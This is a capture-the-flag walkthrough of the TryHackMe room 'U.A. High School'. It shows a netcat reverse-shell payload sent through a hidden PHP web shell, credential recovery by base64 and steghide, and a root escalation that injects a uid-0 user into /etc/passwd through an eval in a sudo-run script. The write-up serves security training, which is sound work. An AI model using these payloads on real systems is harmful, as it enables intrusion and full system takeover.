---
title: "TryHackMe: U.A. High School"
author: leuk7
categories:
  - TryHackMe
tags:
  - THM
  - CTF
  - Easy
  - Web_Shell
  - Root_Shell_Script
render_with_liquid: false
media_subpath: /assets/images_rooms/tryhackme_yueiua
image:
  path: room_image.png
---

Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.
Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

[![Tryhackme Room Link](room_image.png){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/yueiua){: .center }

## Initial enumeration

### Nmap Scan

```bash
┌──(leuk7㉿red-team)-[~/Documents/Tryhackme/rooms/yueiua]
└─$ rustscan -a 10.10.49.127 -r 1-65535 -u 5000 -- -A -oN nmap/init.scan

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4WNbSymq7vKwxstoKDOXzTzNHnE4ut9BJPBlIb44tFvtMpfpXDF7Bq7MT9q4CWASVfZTw763S0OrtvpBFPpN/4eOvlircakFfkR3hZk7dHOXe8+cHXDth90XnMa2rq5CfxwinqP/Mo67XcpagbpU9O5lCatTMPWBUcEhIOXY8aUSMkmN6wRYSxdI40a4IYsjRqkqsdA6yaDQBSx+ryFRXwS9+kpUskAv452JKi1u2H5UGVX862GC1xAYHapKY24Yl6l5rTToGqTkobHVCv6t9dyaxkGtc/Skoi2mkWE/GM0SuqtbJ9A1qhSrfQRNpcIJ6UaVhDdUeO3qPX2uXPyLrY+i+1EgYEsRsxD5ym0bT1LPby8ONPduBEmZfnNoN5IBR05rQSSHhj349oNzDC4MRn2ygzOyx0n0c7wqffaAuohbu0cpeAcl5Nwb/Xw42RABDFQx08CttjNmtPMK/PqFt+H4nubyp7P8Pwctwi3wLf2GbU1lNgT0Ewf2GnfxY5Bs=
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+IqWgEnT5Asc+8VrYsQACkIjP+2CKuoor+erbKjpKwM8+X+1TPuwG56O6LxOLXeS2/pFjv9PBFI1oqHKa4GNw=
|   256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQa5m2TxGI3a9ZwhAd0zWsAYwCsYANdo6fgpS8XiJKL
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.18 seconds


```
With a nmap scan, there are three ports open:
- 22/SSH
- 80/HTTP

### Enumarating Port 80

The root page look like that:

![Website Index Page](root-page-http.png){: width="1000" height="400" }

Since the index page do not end with `.php`, it most likely not using php.
Also there is a `CONTACT` page with a form, which could vulnerable to `XSS` or `SQL Injection`. Unfortunately, we did not manage to found any vulnerability there. 
Let's enumarate the root page with `gobuster`
```bash
┌──(leuk7㉿red-team)-[~/Documents/Tryhackme/rooms/yueiua]
└─$ gobuster dir -u http://10.10.49.127 -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-directories.txt --random-agent
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.49.127
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.49.127/assets/]
```

There is a folder name `assets`, but when access it, it return a blank page. But the weird part is that the there is an `images` folder with the background image there.

![Website root page background image](root-page-background-img.png){: width="1000" height="400" }

Adding `index.html` after the `assets` folder return a 404 status. But changing it to `index.php` we return our blank page. We can conclude that there is a `index.php` file inside `/assets`. At this point the `index.php` could be a backdoor place by someone and could be using a parameter to execute shell command. Let's try to fuzz the `index.php` parameters.

```bash
┌──(leuk7㉿red-team)-[~/Documents/Tryhackme/rooms/yueiua]
└─$ gobuster fuzz -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-words.txt -u http://10.10.49.127/assets/index.php?FUZZ=id --random-agent --exclude-length 0
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.10.49.127/assets/index.php?FUZZ=id
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-words.txt
[+] Exclude Length:   0
[+] User Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20050918 Firefox/1.0.6
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=72] [Word=cmd] http://10.10.49.127/assets/index.php?cmd=id
                                               
```
The `index.php` is in fact vulnerable to a command injection. Using revshell website, we could generate a paylod and get a reverse shell, after having setup a reverse shell listener.

## Get User Shell
```
payload:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.104.176 9001 >/tmp/f

Url encoded payload:
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.11.104.176%209001%20%3E%2Ftmp%2Ff
```
Listener
```
```bash
┌──(leuk7㉿red-team)-[~]
└─$ pwncat-cs -l -p 9001              
/home/leuk7/.local/share/pipx/venvs/pwncat-cs/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
  'class': algorithms.Blowfish,
[11:11:10] Welcome to pwncat 🐈!                                                                                                               __main__.py:164
[11:13:38] received connection from 10.10.176.35:43320                                                                                              bind.py:84
[11:13:41] 0.0.0.0:9001: upgrading from /usr/bin/dash to /usr/bin/bash                                                                          manager.py:957
[11:13:42] 10.10.176.35:43320: registered new host w/ db                                                                                        manager.py:957
(local) pwncat$                                                                                                                                               
(remote) www-data@myheroacademia:/var/www/html/assets$ whoami
www-data
(remote) www-data@myheroacademia:/var/www/html/assets$
```
Users enumeration:

```bash
(remote) www-data@myheroacademia:/var/www/html/assets/images$ cat /etc/passwd | grep "/home/\|/bin/bash"
root:x:0:0:root:/root:/bin/bash
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
deku:x:1000:1000:deku:/home/deku:/bin/bash
(remote) www-data@myheroacademia:/var/www/html/assets/images$
```
Web server file enumeration:
```bash
(remote) www-data@myheroacademia:/var/www/html/assets/images$ ls -la
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
(remote) www-data@myheroacademia:/var/www/html/assets/images$ file oneforall.jpg 
oneforall.jpg: data
(remote) www-data@myheroacademia:/var/www/html/assets/images$
total 16
drwxr-xr-x  4 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 14 root     root     4096 Jul  9  2023 ..
drwxrwxr-x  2 www-data www-data 4096 Jul  9  2023 Hidden_Content
drwxr-xr-x  3 www-data www-data 4096 Dec 13  2023 html
(remote) www-data@myheroacademia:/var/www$ ls -la Hidden_Content/
total 12
drwxrwxr-x 2 www-data www-data 4096 Jul  9  2023 .
drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
(remote) www-data@myheroacademia:/var/www$ cat Hidden_Content/passphrase.txt 
QWxsbWlnaHRGb3JFdmVyISEhCg==
(remote) www-data@myheroacademia:/var/www$ echo -n "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
AllmightForEver!!!
(remote) www-data@myheroacademia:/var/www$ 
```
We successfuly find a file `passphrase.txt` and crack its content `AllmightForEver!!!`. 
There are also file `oneforall.jpg` with a type of `data` but the extension is `jpg`. We will retrieve it to our attacking box, to take a closer look.
After inspecting the file with `hexeditor`, we have noticed that the magic bytes for the file is PNG instead of JPG.

![oneforall-magic-byte-before.png](oneforall-magic-byte-before.png){: width="500" height="200" }

Let's modify it to reflect the actual file extension. We could use this [link](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) to look for the magic byte of JPEG (FF D8 FF E0 00 10 4A 46 49 46).

![oneforall-magic-byte-after.png](oneforall-magic-byte-after.png){: width="500" height="200" }

![oneforall.png](oneforall.png){: width="1000" height="400" }

Let's try to investigate or maybe crackit (with the discovered password) with steghide:

```bash
┌──(leuk7㉿red-team)-[~/…/Tryhackme/rooms/yueiua/loot]
└─$ steghide info oneforall-back.jpg
"oneforall-back.jpg":
  format: jpeg
  capacity: 5.4 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "creds.txt":
    size: 150.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
                                                                                                                                                              
┌──(leuk7㉿red-team)-[~/…/Tryhackme/rooms/yueiua/loot]
```

There is an embeded file inside the image `creds`. Let's extract it:

```bash
└─$ steghide extract -sf oneforall-back.jpg               
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                                                                                              
┌──(leuk7㉿red-team)-[~/…/Tryhackme/rooms/yueiua/loot]
└─$ cat creds.txt 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
                                                                                                                                                              
┌──(leuk7㉿red-team)-[~/…/Tryhackme/rooms/yueiua/loot]
└─$ 
```
We found `deku` password: `One?For?All_!!one1/A`

```bash
(remote) www-data@myheroacademia:/var/www$ su deku -
Password:            
deku@myheroacademia:/var/www$ whoami 
deku
deku@myheroacademia:/var/www$
```
We Can now read the user flag:
```
root@myheroacademia:/home/deku# cat /home/deku/user.txt
```

We are now logged in as deku. The next step is the root priv escalation.

## Get Root Shell

Enumerate sudo capabilities:

```bash
deku@myheroacademia:/var/www$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
deku@myheroacademia:/var/www$ 
```
There is a script named `feedback.sh` that we could run ad `root`. Let's investigate the script.

```bash
deku@myheroacademia:/var/www$ ls -la /opt/NewComponent/
total 12
dr-xr-xr-x 2 root root 4096 Jan 23  2024 .
drwxr-xr-x 3 root root 4096 Jul  9  2023 ..
-r-xr-xr-x 1 deku deku  684 Jan 23  2024 feedback.sh
deku@myheroacademia:/var/www$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

deku@myheroacademia:/var/www$
```
The script check is there is a variable named `$feedback` that match some expression. If it's the case, it ask us to input a feedback,  evaluate (`eval`) by displaying the content of the variable, by running it as shell command. End then save it in `/var/log/feedback`. 
We have try to get a reverse shell but it was unsucessful. But we manage to write in a file as root.
```bash
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
echo -n "Hello Worlds" >> /tmp/test.txt
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ ls /tmp/
snap-private-tmp
systemd-private-5fb358bfc66c47fe85ea1b73687c6009-apache2.service-Hh93Xi
systemd-private-5fb358bfc66c47fe85ea1b73687c6009-ModemManager.service-IXSvMf
systemd-private-5fb358bfc66c47fe85ea1b73687c6009-systemd-logind.service-y504Si
systemd-private-5fb358bfc66c47fe85ea1b73687c6009-systemd-resolved.service-jmrpRi
systemd-private-5fb358bfc66c47fe85ea1b73687c6009-systemd-timesyncd.service-2A5XYe
test.txt
deku@myheroacademia:~$ ls -la /tmp/
total 56
drwxrwxrwt 13 root root 4096 Aug 29 12:22 .
drwxr-xr-x 19 root root 4096 Jul  9  2023 ..
drwxrwxrwt  2 root root 4096 Aug 29 12:17 .font-unix
drwxrwxrwt  2 root root 4096 Aug 29 12:17 .ICE-unix
drwx------  3 root root 4096 Aug 29 12:18 snap-private-tmp
drwx------  3 root root 4096 Aug 29 12:18 systemd-private-5fb358bfc66c47fe85ea1b73687c6009-apache2.service-Hh93Xi
drwx------  3 root root 4096 Aug 29 12:18 systemd-private-5fb358bfc66c47fe85ea1b73687c6009-ModemManager.service-IXSvMf
drwx------  3 root root 4096 Aug 29 12:18 systemd-private-5fb358bfc66c47fe85ea1b73687c6009-systemd-logind.service-y504Si
drwx------  3 root root 4096 Aug 29 12:18 systemd-private-5fb358bfc66c47fe85ea1b73687c6009-systemd-resolved.service-jmrpRi
drwx------  3 root root 4096 Aug 29 12:17 systemd-private-5fb358bfc66c47fe85ea1b73687c6009-systemd-timesyncd.service-2A5XYe
-rw-r--r--  1 root root   21 Aug 29 12:22 test.txt
drwxrwxrwt  2 root root 4096 Aug 29 12:17 .Test-unix
drwxrwxrwt  2 root root 4096 Aug 29 12:17 .X11-unix
drwxrwxrwt  2 root root 4096 Aug 29 12:17 .XIM-unix
deku@myheroacademia:~$
```
So let's modify hash in `/etc/passwd` with a new user (`leuk7`) as member or root group.

```
┌──(leuk7㉿red-team)-[~]
└─$ openssl passwd 1234              
$1$leC3W1LX$ihEBVYlkEb/ExyqT4G0au0
                                                                                                                                                              
┌──(leuk7㉿red-team)-[~]
Payload: 
'leuk7:$1$leC3W1LX$ihEBVYlkEb/ExyqT4G0au0:0:0:leuk7:/root:/bin/bash' >> /etc/passwd
```


```bash
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh 
[sudo] password for deku: 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
'leuk7:$1$leC3W1LX$ihEBVYlkEb/ExyqT4G0au0:0:0:leuk7:/root:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ cat /etc/passwd | grep -v "nologin"
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
deku:x:1000:1000:deku:/home/deku:/bin/bash

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
leuk7:$1$leC3W1LX$ihEBVYlkEb/ExyqT4G0au0:0:0:leuk7:/root:/bin/bash
deku@myheroacademia:~$ su leuk7
Password: 
root@myheroacademia:/home/deku# cat /root/
.bash_history  .bashrc        .local/        .profile       root.txt       snap/          .ssh/          
```

We can now read the root flag

```bash
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
```
